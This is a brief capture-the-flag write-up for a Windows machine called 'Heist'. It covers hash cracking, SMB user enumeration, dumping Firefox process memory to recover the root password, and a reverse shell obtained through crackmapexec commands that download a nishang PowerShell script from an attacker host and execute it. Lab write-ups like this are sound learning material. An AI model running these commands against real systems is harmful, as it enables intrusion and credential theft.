# Heist

Machine with winrm running, SMB service and http web application with login
page but possibility of guest login.

First step is quite easy (find an attachment in the web application with
some credential hashes). Some of then can be cracked with online tools.
The strongest hash can be cracked by dictionary attack with john.

## Important notes here

* Remember to inspect everything and perform always an exhaustive scan of 
all services and places accessible.

* CrackMapExec has an additional module to attack winrm service (no need of other tools like evilwinrm).

* There's a really usefull script from impacket to list available users using SMB which is lookupsid.py.

* Root password can be extracted from process memory. This is possible because firefox is running in the system and we can use a tool like procdump.exe to extract all memory information of this process.

## Possibilities to reverse shell here

* Of course winevil-rm will promp a reverse shell directly.

* For manual reverse shell I've tried first to use SMB to share a folder with nc.exe. This didn't work because of some kind of SMB version incompatibilities (I've tried with smb2support flag but it didn't work anyway).

* How I did it then?

	1. Get InvokeReverseShell.ps1 file from nishang.
	2. Share a python server with this file.
	3. Execute with crackmapexec a wget but using powershell from cmd. ```cme winrm [ip] -u [user] -p [password] -x "powershell -Command wget [attackerIp]:[attackerPort]/PS.ps1 -outfile ps.ps1"```
	4. Execute with crackmapexec the powershell script: ```cme winrm [ip] -u [user] -p [password] -x "powershell -File ps.ps1"```
